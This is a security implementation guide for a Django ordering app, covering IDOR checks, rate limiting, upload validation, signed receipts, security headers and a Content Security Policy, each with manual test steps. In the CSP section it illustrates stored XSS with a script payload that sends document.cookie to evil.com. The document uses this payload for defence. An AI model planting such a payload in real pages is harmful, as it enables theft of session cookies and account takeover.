# Security Implementation — Customer Side

---

## 1. IDOR Protection (Insecure Direct Object Reference)

**File:** `customers/views.py`
**Functions:** `download_invoice`, `upload_payment_proof`, `payment_page`, `start_stripe_payment`, `order_success`, `stripe_success`, `stripe_cancel`, `cancel_order`, `submit_complaint`, `reorder`

All views that accept an `order_id` use `get_object_or_404(Order, id=order_id, customer=request.user)`. Customers can only access their own orders — any other ID returns 404.

**How to test:**
1. Log in as Customer A and place an order. Note the order ID (e.g. `5`).
2. Log in as Customer B.
3. Manually visit `/orders/5/success/`, `/orders/5/payment/`, `/orders/5/cancel/`.
4. Each URL should return a 404, not Customer A's order data.

---

## 2. Rate Limiting

**File:** `admins/views.py` (login), `customers/views.py` (all other endpoints)
**Functions:** `unified_login`, `submit_order`, `upload_payment_proof`, `submit_complaint`, `cancel_order`, `reorder`, `add_to_cart`
**Config:** `zarlyOs/settings.py` → `INSTALLED_APPS`, `CACHES`, `SILENCED_SYSTEM_CHECKS`
**Dependency:** `django-ratelimit==4.1.0` in `requirements.txt`

All limits use `block=False` so a friendly error message is shown instead of a bare 403.

Login is keyed by IP to catch credential-stuffing. All other endpoints are keyed by the logged-in user to avoid shared-IP false positives.

| View | Limit | Key |
|---|---|---|
| `unified_login` | 10 / minute | IP address |
| `submit_order` | 10 / minute | User |
| `upload_payment_proof` | 10 / hour | User |
| `submit_complaint` | 5 / hour | User |
| `cancel_order` | 5 / minute | User |
| `reorder` | 20 / minute | User |
| `add_to_cart` | 60 / minute | User |

Cache backend is `LocMemCache` in development (single-worker only). Replace with Redis in production via `settings.py CACHES`.

**How to test (login rate limit):**
1. Go to `/login/`.
2. Submit the form with wrong credentials 11 times in under a minute.
3. On the 11th attempt you should see: *"Too many login attempts. Please wait a minute before trying again."*

**How to test (add to cart):**
In the browser console on the menu page, run:
```js
for (let i = 0; i < 65; i++) {
  document.querySelector('[data-cart-form]').dispatchEvent(new Event('submit', {bubbles:true}));
}
```
After ~60 submissions you should see a toast: *"Too many requests. Please slow down."*

---

## 3. File Upload Validation

**File:** `customers/payment_utils.py`
**Function:** `validate_payment_proof(file, max_size_mb=5)`

**Applied in:** `customers/views.py`
- `upload_payment_proof` — payment proof images
- `submit_complaint` — evidence images

Checks:
- File size ≤ 5 MB
- Extension must be one of: `jpg`, `jpeg`, `png`, `gif`, `webp`, `pdf`
- Non-PDF files are opened with Pillow to verify the image data is not corrupted or a disguised executable

**How to test:**
1. Go to a payment page and try uploading a `.exe` file renamed to `proof.jpg`.
2. The upload should be rejected with a validation error.
3. Try uploading a file larger than 5 MB — same result.
4. Try uploading a valid `.png` — it should succeed.

---

## 4. Receipt Forgery Prevention

**File:** `customers/views.py`
**Function:** `verify_receipt`
**Supporting model:** `admins.models.DigitalSignature`
**Supporting utility:** `admins/utils.py` → `sign_pdf_digitally`

Invoices are signed with a PKCS#7 digital signature (PyHanko library) at approval time. The SHA-256 hash of the signed PDF is stored in `DigitalSignature`. The public endpoint at `/verify/<order_id>/` recomputes the hash on the stored file and re-validates the embedded signature — any byte-level modification is detected.

This was already in place before this session. No changes made.

**How to test:**
1. Get an approved order with a signed receipt and go to `/verify/<order_id>/`.
2. You should see a "Valid" result with the hash and signing details.
3. Manually open the PDF file on disk (in `media/`) with a hex editor and change one byte.
4. Re-visit `/verify/<order_id>/` — status should change to `tampered`.

---

## 5. Replay Attack Protection on Payment Proof

**File:** `customers/views.py`
**Function:** `upload_payment_proof` (lines ~170–185)

Before accepting a manual bank transfer proof, the view checks whether a Stripe payment record with `status='succeeded'` already exists for that order. If yes, the upload is rejected.

This prevents a customer from paying by card, then also uploading fake manual proof to claim a double refund.

```python
stripe_confirmed = order.payments.filter(payment_method='stripe', status='succeeded').exists()
if stripe_confirmed:
    messages.error(request, 'This order has already been paid via card. No manual proof required.')
    return redirect('order_success', order_id=order.id)
```

**How to test:**
1. Place an order and complete payment via Stripe (use Stripe test card `4242 4242 4242 4242`).
2. Wait for the Stripe webhook to confirm the payment (`stripe listen` in terminal).
3. Manually navigate to the payment proof upload URL for that order.
4. The page should redirect with the error message above instead of showing the upload form.

---

## 6. Security Headers

**File:** `zarlyOs/settings.py` (bottom of file, under `# SECURITY HEADERS`)

| Setting | HTTP Header | Effect |
|---|---|---|
| `SECURE_CONTENT_TYPE_NOSNIFF = True` | `X-Content-Type-Options: nosniff` | Blocks MIME-sniffing — browser respects declared content type |
| `X_FRAME_OPTIONS = 'DENY'` | `X-Frame-Options: DENY` | Blocks the app being embedded in any iframe (clickjacking) |
| `SECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'` | `Referrer-Policy` | Limits referrer URL leakage to external sites |
| `SESSION_COOKIE_HTTPONLY = True` | `HttpOnly` flag on session cookie | JavaScript `document.cookie` cannot read the session token |
| `CSRF_COOKIE_HTTPONLY = True` | `HttpOnly` flag on CSRF cookie | JavaScript cannot read the CSRF cookie |

Production settings (commented out in `settings.py` — require HTTPS):
- `SECURE_SSL_REDIRECT` — redirect all HTTP to HTTPS
- `SESSION_COOKIE_SECURE` / `CSRF_COOKIE_SECURE` — cookies only sent over HTTPS
- `SECURE_HSTS_SECONDS = 31536000` — tell browsers to only use HTTPS for 1 year

**How to test:**
1. Start the dev server and open any page.
2. In browser DevTools → Network tab → click any response → Headers.
3. You should see: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`.
4. In DevTools → Application → Cookies, the `sessionid` and `csrftoken` cookies should have the `HttpOnly` flag checked.

---

## 7. Receipt Hash Verification on Complaint

**File:** `customers/views.py`
**Function:** `submit_complaint` (inside the `if request.method == 'POST':` block)

When a complaint is filed, the view looks for a `DigitalSignature` record on the order and, if found, recomputes the SHA-256 hash of the invoice PDF on disk to check it matches the stored hash.

The result is written to the audit log (`AuditLog`) in the `metadata` field as `receipt_verified`:
- `True` — invoice PDF is intact and unmodified
- `False` — invoice PDF has been tampered (admin should be suspicious of this complaint)
- `None` — no signed invoice exists yet (e.g. order not yet approved/delivered)

The complaint is never blocked — the check is purely for admin visibility.

**How to test:**
1. File a complaint on a delivered order that has a signed invoice.
2. Open the Django admin or query the DB: `AuditLog.objects.filter(action='complaint_submitted').last().metadata`.
3. You should see `{"subject": "...", "receipt_verified": true}`.
4. To test the tamper case: manually edit the PDF bytes on disk, then file another complaint on the same order.
5. The audit log entry should now show `"receipt_verified": false`.

---

## 8. Deferred: Password Validators

**File:** `zarlyOs/settings.py` (lines 99–112, commented out)

`AUTH_PASSWORD_VALIDATORS` is currently disabled. Re-enabling the four built-in validators (similarity, minimum length, common passwords, numeric-only) is tracked as a todo item.

---

## 9. Content Security Policy (CSP)

**File:** `zarlyOs/settings.py` (CSP_* settings)
**Middleware:** `zarlyOs.middleware.EagerNonceCSPMiddleware` in `zarlyOs/settings.py → MIDDLEWARE`
**Package:** `django-csp==3.8`

### What It Does

Every HTTP response now carries a `Content-Security-Policy` header. This header tells the browser a whitelist of what it's allowed to load and execute on each page. Anything not on the list is silently blocked — even if it's already in the HTML.

The most important directive is `script-src`. Ours looks like:

```
script-src 'self' 'nonce-a3Fk9...' https://cdn.jsdelivr.net https://unpkg.com
```

- `'self'` — scripts from our own domain are allowed
- `'nonce-a3Fk9...'` — inline scripts are allowed only if they carry this exact random value as an attribute. The value changes on every request.
- CDN origins — Bootstrap, Chart.js, Leaflet are explicitly whitelisted

### What Attack It Prevents

**Stored XSS (Cross-Site Scripting):**

Suppose an attacker files a complaint with the subject line:
```
Great food! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

If that text is ever rendered unescaped in an admin page, the browser would normally execute that `<script>` block and send the admin's session cookie to the attacker's server — giving them full admin access.

With CSP, that injected `<script>` has no `nonce=` attribute. The browser sees it, checks it against the `Content-Security-Policy` header, finds no match, and **refuses to execute it**. The attack is dead before it starts.

This is true even if Django's template escaping fails (e.g. a developer mistakenly uses `{{ value|safe }}`). CSP is the safety net behind the safety net.

### Why `'unsafe-inline'` Is Not in `script-src`

`'unsafe-inline'` would allow any inline script to run — including injected ones. It defeats the entire purpose of CSP for scripts. Our legitimate inline scripts instead carry a per-request nonce token that the attacker cannot know in advance.

### Why `style-src` Allows `'unsafe-inline'`

The app has hundreds of `style="..."` HTML attributes that cannot carry nonces. CSS injection is also much harder to weaponise than JavaScript injection (CSS has no `fetch`, no cookie access). This is an accepted trade-off — `script-src` is where the real protection lives.

### How to Test It Yourself

**Option 1 — Browser DevTools (30 seconds):**
1. Open any page in Chrome/Firefox.
2. Open DevTools → Network tab → click any document request → Headers.
3. Find `Content-Security-Policy` in the response headers.
4. Confirm `script-src` contains `'nonce-...'` but NOT `'unsafe-inline'`.
5. In the Elements tab, find any `<script>` tag — it should have a `nonce="..."` attribute matching the header value.

**Option 2 — Simulate an XSS injection (2 minutes):**
1. Open browser DevTools → Console on any page.
2. Type: `document.body.insertAdjacentHTML('beforeend', '<script>alert(1)<\/script>')`
3. Press Enter. Nothing should happen — no alert box.
4. In the Console tab you should see a CSP violation error: `Refused to execute inline script because it violates the following Content Security Policy directive: "script-src ..."`
5. Now copy the nonce value from DevTools → Network → the page's response headers.
6. Type: `document.body.insertAdjacentHTML('beforeend', '<script nonce="PASTE_NONCE_HERE">alert(1)<\/script>')`
7. This one fires — proving only scripts with the correct nonce execute.

**Option 3 — Automated tests:**
```
venv\Scripts\python.exe -m pytest tests/test_csp.py -v
```
All 13 tests should pass.

### Directive Reference

| Directive | Value | What it controls |
|---|---|---|
| `default-src` | `'self'` | Fallback for all resource types not explicitly listed |
| `script-src` | `'self' 'nonce-{n}' jsdelivr unpkg` | Which scripts can execute |
| `style-src` | `'self' 'unsafe-inline' jsdelivr unpkg fonts.googleapis.com` | Which styles can apply |
| `font-src` | `'self' fonts.gstatic.com` | Which font files can load |
| `img-src` | `'self' data: blob:` | Which images can display |
| `connect-src` | `'self'` | Which origins fetch/XHR can call |
| `frame-ancestors` | `'none'` | Who can embed this page in an iframe (none) |
| `object-src` | `'none'` | Flash / plugins (none) |
| `base-uri` | `'self'` | Prevents `<base href>` hijacking |
| `form-action` | `'self'` | Where forms can submit |
